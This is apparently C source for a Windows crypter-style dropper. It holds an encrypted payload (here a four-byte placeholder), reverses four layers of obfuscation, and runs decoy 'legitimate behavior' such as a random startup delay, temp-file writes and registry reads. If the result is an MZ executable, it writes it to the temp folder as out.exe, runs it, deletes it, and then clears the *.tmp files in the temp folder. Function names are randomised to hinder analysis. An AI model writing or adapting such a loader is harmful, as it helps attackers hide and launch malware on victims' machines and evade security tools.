#include <windows.h>
#include <stdio.h>
#include <shellapi.h>
#include <shlobj.h>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:WinMainCRTStartup")
#pragma comment(linker, "/MERGE:.rdata=.text")
#pragma comment(linker, "/MERGE:.data=.text")
#pragma comment(linker, "/OPT:REF")
#pragma comment(linker, "/OPT:ICF")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

#define ORIGINAL_SIZE 4

// Encrypted payload
BYTE encrypted_payload[] = { 0x41, 0x42, 0x43, 0x44 };

// Decryption key
BYTE decryption_key[] = { 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x61, 0x62,
0x63, 0x64, 0x65, 0x66, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
0x38, 0x39, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66 };

// Metadata
char* COMPANY_NAME = "Acme\"Corp";
char* PRODUCT_NAME = "Prod";
char* FILE_DESCRIPTION = "Desc";

// Decryption function
void whqo5qlp6hn7(BYTE* data, int size, BYTE* key, int key_len) {
    int i;
    
    // Reverse layer 4
    for (i = size - 1; i >= 0; i--) {
        data[i] = (data[i] * 189) & 0xFF; // 189 is modular inverse of 17 mod 256
        if (i + 1 < size) {
            data[i] ^= data[i + 1];
        }
    }
    
    // Reverse layer 3
    for (i = 0; i < size; i++) {
        if (i % 3 == 0) {
            data[i] = (data[i] - key[i % key_len]) & 0xFF;
        } else if (i % 3 == 1) {
            data[i] = (data[i] + key[i % key_len]) & 0xFF;
        } else {
            data[i] ^= 0xAA;
        }
    }
    
    // Reverse layer 2
    for (i = 0; i < size; i++) {
        if (i % 2 == 0) {
            data[i] = ((data[i] >> 3) | (data[i] << 5)) & 0xFF;
        } else {
            data[i] = ((data[i] << 2) | (data[i] >> 6)) & 0xFF;
        }
    }
    
    // Reverse layer 1
    for (i = 0; i < size; i++) {
        int key_idx = (i * 7) % key_len;
        data[i] ^= (key[key_idx] + i) & 0xFF;
    }
}

// Legitimate behavior simulation
void iewhozvz8z() {
    // Initial delay (simulates normal app startup)
    Sleep(1000 + GetTickCount() % 3000);
    
    // Check system resources
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(memInfo);
    GlobalMemoryStatusEx(&memInfo);
    
    // Access common system paths
    CHAR path[MAX_PATH];
    GetTempPathA(MAX_PATH, path);
    GetSystemDirectoryA(path, MAX_PATH);
    
    // Create legitimate-looking files
    CHAR tempFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tempFile);
    strcat(tempFile, "temp_config.ini");
    
    HANDLE hFile = CreateFileA(tempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
                              FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        CHAR config[] = "[Settings]\r\nVersion=1.0\r\n";
        DWORD written;
        WriteFile(hFile, config, strlen(config), &written, NULL);
        CloseHandle(hFile);
        DeleteFileA(tempFile);
    }
    
    // Simulate registry access
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows", 
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
    }
}

// Execution function
BOOL c3mnu60m0f(BYTE* payload, int size) {
    if (payload[0] != 'M' || payload[1] != 'Z') {
        return FALSE;
    }
    
    // Write to temp directory
    CHAR tempPath[MAX_PATH];
    CHAR exePath[MAX_PATH];
    
    GetTempPathA(MAX_PATH, tempPath);
    sprintf(exePath, "%s%s", tempPath, "out.exe");
    
    // Write executable
    HANDLE hFile = CreateFileA(exePath, GENERIC_WRITE, 0, NULL, 
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    DWORD written;
    WriteFile(hFile, payload, size, &written, NULL);
    FlushFileBuffers(hFile);
    CloseHandle(hFile);
    
    // Add delay before execution
    Sleep(500);
    
    // Execute
    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpFile = exePath;
    sei.nShow = SW_SHOWNORMAL;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    
    if (ShellExecuteExA(&sei)) {
        // Wait a bit then delete the file
        Sleep(2000);
        DeleteFileA(exePath);
        return TRUE;
    }
    
    DeleteFileA(exePath);
    return FALSE;
}

// Cleanup function
void qzhcfoc6uo() {
    // Clean temp files
    CHAR tempPath[MAX_PATH];
    CHAR tempFile[MAX_PATH];
    
    GetTempPathA(MAX_PATH, tempPath);
    sprintf(tempFile, "%s*.tmp", tempPath);
    
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(tempFile, &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                CHAR fullPath[MAX_PATH];
                sprintf(fullPath, "%s%s", tempPath, findData.cFileName);
                DeleteFileA(fullPath);
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }
}

// Main entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    
    // Simulate legitimate behavior first
    iewhozvz8z();
    
    // Decrypt payload
    whqo5qlp6hn7(encrypted_payload, ORIGINAL_SIZE, 
                  decryption_key, sizeof(decryption_key));
    
    // Execute payload
    BOOL success = c3mnu60m0f(encrypted_payload, ORIGINAL_SIZE);
    
    // Cleanup
    qzhcfoc6uo();
    
    return success ? 0 : 1;
}
